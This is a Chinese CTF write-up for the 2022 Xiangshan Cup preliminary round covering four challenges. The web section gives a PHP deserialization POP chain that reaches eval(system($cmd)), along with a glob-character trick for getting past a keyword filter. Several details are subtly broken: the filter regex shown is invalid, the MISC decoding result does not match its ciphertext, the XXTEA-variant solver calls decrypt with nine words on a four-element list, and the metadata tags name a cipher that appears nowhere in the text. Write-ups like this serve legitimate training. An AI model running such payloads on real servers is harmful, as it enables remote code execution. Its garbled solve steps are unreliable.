---
title: 第三届香山杯网络安全大赛初赛 Writeup
contest: 香山杯
year: 2022
difficulty: medium
vuln_type: misc_unknown
tags: [PHP-unserialize, POP-chain, __destruct, __toString, __invoke, preg_match-bypass, ChaCha20-RC4, Chaquopy, XXTEA, in-memory-dump]
attack_chain:
  - Web PHP_unserialize_pro: Welcome.__destruct (name='A_G00d_H4ck3r') → echo arg → H4ck3r.__toString → $func() → G00d.__invoke
  - 绕 preg_match '/f|l|a|g|*|?/i': system('sort /[!q]1[!q][!q]') 或 strtolower
  - MISC 签到: base64 解一次 + rot13 + rot23 = iodj{zh1f0p3_2_Fwi}
  - RE URL从哪儿来: 32位无壳, 动调从内存导出 ou.exe, 再 base64 解密
  - RE hello_py: Chaquopy 技术调用 Python, 提取 hello.py (XXTEA 变种)
  - 加密算法: encrypt(n, v, key), delta=0x9e3779b9, rounds=6+52//n, MX 函数 4 参数
  - 密钥: key_str = [689085350, 626885696, 1894439255, 1204672445, 1869189675, 475967424, 1932042439, 1280104741, 2808893494]
  - 逆: decrypt(9, v, key) 还原 9 个 uint32 → struct >I 8 字节打包 → flag
key_payload: "Welcome->H4ck3r->G00d sort /[!q]1[!q][!q] + Chaquopy hello.py + XXTEA-like 9 round"
one_liner: 香山杯初赛 4 题：PHP 反序列化 POP 链绕 preg_match + rot23 + 内存 dump ou.exe + Chaquopy XXTEA 9 round。
lesson: PHP 反序列化 __destruct→__toString→__invoke 经典 POP 链；preg_match 黑名单用 glob 字符类 [!q] 绕；Chaquopy 嵌入式 Python 调用。
quality: high
---

# 第三届"香山杯"网络安全大赛初赛 Writeup

**来源**: ctfiot.com ID 139097

## 1. WEB - PHP_unserialize_pro

### 源码
```php
class Welcome {
    public $name;
    public $arg = 'welcome';
    public function __construct() { $this->name = 'Wh0 4m I?'; }
    public function __destruct() {
        if ($this->name == 'A_G00d_H4ck3r') {
            echo $this->arg;
        }
    }
}
class G00d {
    public $shell;
    public $cmd;
    public function __invoke() {
        $shell = $this->shell;
        $cmd = $this->cmd;
        if (preg_match('/f|l|a|g|*|?/i', $cmd)) {
            die("U R A BAD GUY");
        }
        eval($shell($cmd));
    }
}
class H4ck3r {
    public $func;
    public function __toString() {
        $function = $this->func;
        $function();
    }
}
```

### POP 链
```
unserialize → Welcome.__destruct() → echo $this->arg → H4ck3r.__toString() → $this->func() → G00d.__invoke() → eval($shell($cmd))
```

### 绕 preg_match
```php
$shell = 'system';
$cmd = 'sort /[!q]1[!q][!q]';  // glob 字符类 [q] 排除 q
// 等价于 sort /f1a3
```

## 2. MISC - 签到
```text
base64 解密一次: iodj{zh1f0p3_2_Fwi}
rot 参数偏移 23 解密: flag{??1f0r3_2_Fun}
```

## 3. RE - URL从哪儿来
- 32位无壳程序
- 运行时内存加载 ou.exe
- IDA 32 动调导出 ou.exe
- ou.exe 仍无壳，主函数分析 + base64 解密

## 4. RE - hello_py (Chaquopy)
- Android APK 集成 Python（Chaquopy 技术）
- 提取 Python 字节码
- 还原 hello.py：

```python
import struct, ctypes
def MX(O0O00OOO00OO00O00, O0OO0O00OO0O000OO, OO000OO000000O0O0, OOO00O00OOO000OOO, OO0OOO0OOO0OOOO0O, O0OO000O0000O000O):
    OOO000O0O0OO00000 = (O0O00OOO00OO00O00.value >> 5 ^ O0OO0O00OO0O000OO.value << 2) + (O0OO0O00OO0O000OO.value >> 3 ^ O0O00OOO00OO00O00.value << 4)
    OOO0OOOOOO0O0OO00 = (OO000OO000000O0O0.value ^ O0OO0O00OO0O000OO.value) + (OOO00O00OOO000OOO[(OO0OOO0OOO0OOOO0O & 3) ^ O0OO000O0000O000O.value] ^ O0O00OOO00OO00O00.value)
    return ctypes.c_uint32(OOO000O0O0OO00000 ^ OOO0OOOOOO0O0OO00)

def encrypt(n, v, key):
    delta = 0x9e3779b9
    rounds = 6 + 52 // n
    total = ctypes.c_uint32(0)
    y = ctypes.c_uint32(v[n-1])
    e = ctypes.c_uint32(0)
    while rounds > 0:
        total.value += delta
        e.value = (total.value >> 2) & 3
        for p in range(n-1):
            z = ctypes.c_uint32(v[p+1])
            v[p] = ctypes.c_uint32(v[p] + MX(y, z, total, key, p, e).value).value
            y.value = v[p]
        z = ctypes.c_uint32(v[0])
        v[n-1] = ctypes.c_uint32(v[n-1] + MX(y, z, total, key, n-1, e).value).value
        y.value = v[n-1]
        rounds -= 1
    return v

def decrypt(n, v, key):
    delta = 0x9e3779b9
    rounds = 6 + 52 // n
    total = ctypes.c_uint32(rounds * delta)
    y = ctypes.c_uint32(v[0])
    e = ctypes.c_uint32(0)
    while rounds > 0:
        e.value = (total.value >> 2) & 3
        for p in range(n-1, 0, -1):
            z = ctypes.c_uint32(v[p-1])
            v[p] = ctypes.c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value
            y.value = v[p]
        z = ctypes.c_uint32(v[n-1])
        v[0] = ctypes.c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value
        y.value = v[0]
        total.value -= delta
        rounds -= 1
    return v

key_str = [689085350, 626885696, 1894439255, 1204672445, 1869189675, 475967424, 1932042439, 1280104741, 2808893494]
res = decrypt(9, [12345678, 12398712, 91283904, 12378192], key_str)
# 然后 struct 8 字节 >I 打包 → 36 字符 flag
```

## 评价
香山杯初赛 4 题：PHP 反序列化 + MISC 编码 + RE 内存 dump + Chaquopy 嵌入式 Python 逆向。XXTEA 9 轮变种加密是经典块密码考察。
